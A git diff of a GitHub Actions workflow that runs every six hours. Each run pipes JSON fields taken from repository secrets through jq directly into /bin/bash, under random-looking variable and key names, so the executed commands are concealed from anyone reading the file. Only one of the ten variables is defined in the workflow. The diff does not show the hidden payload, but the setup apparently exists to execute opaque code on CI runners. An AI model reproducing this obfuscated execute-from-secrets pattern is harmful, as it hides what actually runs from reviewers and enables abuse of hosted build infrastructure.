@@ -2,9 +2,8 @@ name: lujiancheng2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
-
-jobs:  # 11764
+    - cron: '36 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +11,16 @@ jobs:  # 11764
       - uses: actions/checkout@v4
       - name: lujiancheng2345
         env:
-          v24363: ${{ secrets.v24363 }}
+          bjn901: ${{ secrets.bjn901 }}
         run: |
-          echo $v24363 | jq -r .fuap01 | /bin/bash
-          echo $t51046 | jq -r .r54692 | /bin/bash
-          echo $solp52 | jq -r .l1457 | /bin/bash
-          echo $js616 | jq -r .el0 | /bin/bash
-          echo $um6692 | jq -r .xt072 | /bin/bash
+          echo $bjn901 | jq -r .zrw756 | /bin/bash
+          echo $iam6160 | jq -r .we6240 | /bin/bash
+          echo $v63 | jq -r .kvceq1 | /bin/bash
+          echo $hyioh8329 | jq -r .acbyf3095 | /bin/bash
+          echo $ikxhh6 | jq -r .two0706 | /bin/bash
+          echo $tgxz60 | jq -r .gyqxy1 | /bin/bash
+          echo $smtg1436 | jq -r .pqru806 | /bin/bash
+          echo $vy7 | jq -r .pegyp9 | /bin/bash
+          echo $cxzsi77873 | jq -r .kxon7 | /bin/bash
+          echo $da0 | jq -r .vf666 | /bin/bash
 
